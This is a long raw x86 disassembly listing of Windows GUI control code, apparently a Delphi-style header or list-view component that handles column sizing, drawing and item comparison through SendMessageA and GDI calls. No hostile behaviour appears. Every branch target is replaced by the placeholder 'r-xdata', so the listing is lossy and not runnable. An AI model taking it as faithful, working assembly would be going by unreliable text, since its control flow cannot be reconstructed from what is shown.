retn 0x4
sub_437b14
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_437ba0
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_43749c
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402b80
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4043ac
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4041ac
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_437310
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_44a414
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_4372f8
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_418f54
push eax
push edi
mov eax esi
call sub_453e1c
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_437c9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_437ba0
sub_437cc0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_453e1c
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_4192e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_453e1c
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_437ba0
inc edi
dec ebx
jne r-xdata
sub_437d3c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4246ac
xor eax eax
push ebp
push sub_437e3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424af0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424210
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_42432c
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_424af0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424968
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_437e54
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_403370
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_44d07c
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403370
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_438684
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_4298b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_437fea
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_4298b8
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_438418
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_43811c
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_438154
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_451830
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_43811c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d85c
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403370
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_4381f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_44ecb8
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43749c
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_438258
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452408
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4383f3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44d038
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_4383d6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_41814c
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4182a8
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_43749c
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4182a8
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_4373f4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418198
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_438418
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_403370
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_438438
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44cb04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43846c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_45b294
mov eax ebx
call sub_453e1c
xor edx edx
call sub_4298d4
mov edx [ ebx + 0x224 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_420a98
mov eax [ ebx + 0x228 ]
call sub_45a904
push eax
mov eax ebx
call sub_453e1c
pop edx
call sub_4298d4
jmp r-xdata
mov eax ebx
call sub_437cc0
pop esi
pop ebx
retn
sub_4384e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_45a904
push eax
mov eax ebx
call sub_453e1c
pop edx
call sub_4298d4
mov eax ebx
call sub_437cc0
pop esi
pop ebx
retn
sub_438508
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_438558
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438677
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_438654
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419284
push eax
mov eax esi
call sub_418f54
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
mov ecx [ ebp - 0x4 ]
pop edx
call sub_4298e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43865b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_43749c
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_438684
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43749c
pop edx
call sub_438558
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403370
pop esi
pop ecx
pop ebp
retn
sub_438700
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_438748
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_438908
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x8 ]
call sub_4043ac
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_438908
mov esi eax
mov eax ebx
call sub_438908
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2d4 ]
call [ esi + 0x2d0 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4387cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0x1c ] 0xffffffff
mov [ edi + 0x20 ] 0xffffffff
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_438818
push ebx
push esi
push edi
push ebp
call sub_403528
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x4 ]
call sub_43a40c
mov [ ebp + 0x24 ] 0x1
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
cmp ebp [ eax + 0x238 ]
jne r-xdata
mov eax [ eax + 0x278 ]
mov edx ebp
call sub_418444
mov eax ebp
call sub_4390a8
mov esi eax
test esi esi
je r-xdata
xor edx edx
mov [ eax + 0x238 ] edx
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov edx ebp
mov si 0xffad
call sub_403370
mov edx ebp
mov eax esi
call sub_4393d0
inc eax
je r-xdata
xor edx edx
mov eax ebp
call sub_4389e4
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_418b44
test bl bl
jle r-xdata
mov eax ebp
call sub_4388f4
mov edx [ ebp + 0x10 ]
call sub_429910
xor edi edi
mov edi 0x1
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403510
xor edx edx
mov eax ebp
call sub_438eb0
xor edx edx
mov eax esi
call sub_439070
mov edx edi
mov eax esi
call sub_438cd8
test al al
je r-xdata
sub_438910
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al 0x1
mov eax ebx
call sub_4390a8
test eax eax
jne r-xdata
mov eax ebx
call sub_4390a8
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4390a8
mov edx esi
call sub_438910
pop esi
pop ebx
retn
mov al 0x1
jmp r-xdata
pop esi
pop ebx
retn
sub_438950
push ebx
push esi
add esp 0xffffffd8
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4042f8
je r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f40
mov [ esp ] 0x1
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
mov eax ebx
call sub_438908
mov al [ eax + 0x25b ]
add al 0xfe
sub al 0x2
jae r-xdata
cmp [ ebx + 0x25 ] 0x0
je r-xdata
mov eax ebx
call sub_4390a8
test eax eax
je r-xdata
mov eax ebx
call sub_438908
xor edx edx
call sub_43ad30
mov eax ebx
call sub_4390a8
xor edx edx
call sub_4397bc
jmp r-xdata
sub_4389e4
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop ebx
retn
cmp edx [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_438908
mov al [ eax + 0x25b ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_438908
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
sub al 0x2
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
cmp [ ebx + 0x25 ] 0x0
je r-xdata
mov eax ebx
call sub_4390a8
test eax eax
je r-xdata
mov eax ebx
call sub_438908
xor edx edx
call sub_43ad30
mov eax ebx
call sub_4390a8
xor edx edx
call sub_4397bc
jmp r-xdata
sub_438a54
push ebx
push esi
add esp 0xffffffd4
mov [ esp ] dl
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
add esp 0x2c
pop esi
pop ebx
retn
mov [ esp + 0x1 ] 0x8
mov eax [ esi + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax esi
call sub_4388f4
lea edx [ esp + 0x1 ]
call sub_429ab4
test eax eax
je r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x4
ja r-xdata
jmp [ eax * 4 + jump_table_438a9a ]
test [ esp + 0x9 ] 0x4
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x1
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x2
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x20
setne bl
jmp r-xdata
test [ esp + 0x9 ] 0x8
setne bl
sub_438ae8
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
mov [ esp ] 0x8
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
xor eax eax
mov al dl
cmp eax 0x4
ja r-xdata
test cl cl
je r-xdata
jmp [ eax * 4 + jump_table_438b16 ]
xor eax eax
mov [ esp + 0x8 ] eax
mov eax [ esp + 0xc ]
and eax 0xffffffff
mov [ esp + 0x8 ] eax
jmp r-xdata
mov [ esp + 0xc ] 0x4
jmp r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov [ esp + 0xc ] 0x20
jmp r-xdata
mov [ esp + 0xc ] 0x8
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
sub_438b84
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
cmp edx [ ebx + 0x14 ]
je r-xdata
mov eax edx
mov [ ebx + 0x14 ] eax
mov [ esp ] 0x12
mov edx [ ebx + 0x10 ]
mov [ esp + 0x4 ] edx
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x4 ]
cmp [ edx + 0x31a ] 0x0
je r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x18 ] 0xffffffff
jmp r-xdata
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
sub_438bdc
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
cmp edx [ ebx + 0x18 ]
je r-xdata
mov eax edx
mov [ ebx + 0x18 ] eax
mov [ esp ] 0x30
mov edx [ ebx + 0x10 ]
mov [ esp + 0x4 ] edx
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x4 ]
cmp [ edx + 0x322 ] 0x0
je r-xdata
mov [ esp + 0x1c ] eax
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
sub_438c34
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
cmp edx [ ebx + 0x1c ]
je r-xdata
mov esi edx
mov [ ebx + 0x1c ] esi
mov [ esp ] 0x18
mov [ esp + 0xc ] 0xf00
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
mov eax esi
inc eax
call sub_42983c
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
sub_438c84
push ebx
push esi
add esp 0xffffffd8
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
cmp esi [ ebx + 0x20 ]
je r-xdata
mov [ ebx + 0x20 ] esi
test esi esi
jl r-xdata
mov [ esp ] 0x18
mov [ esp + 0xc ] 0xf000
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x1 ]
call sub_4298f4
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
dec esi
sub_438cd8
push ebx
push esi
push edi
mov esi edx
xor edi edi
xor ebx ebx
call sub_4391f4
test eax eax
je r-xdata
cmp esi edi
jne r-xdata
inc edi
mov edx eax
call sub_4391e4
cmp esi edi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
test eax eax
jne r-xdata
sub_438d08
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_439008
test al al
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax esi
call sub_438908
mov edx esi
mov si 0xffb1
call sub_403370
mov ebx eax
mov eax esi
call sub_438908
mov edx esi
mov si 0xffb0
call sub_403370
mov ebx eax
jmp r-xdata
sub_438d5c
push ebx
push esi
mov ebx edx
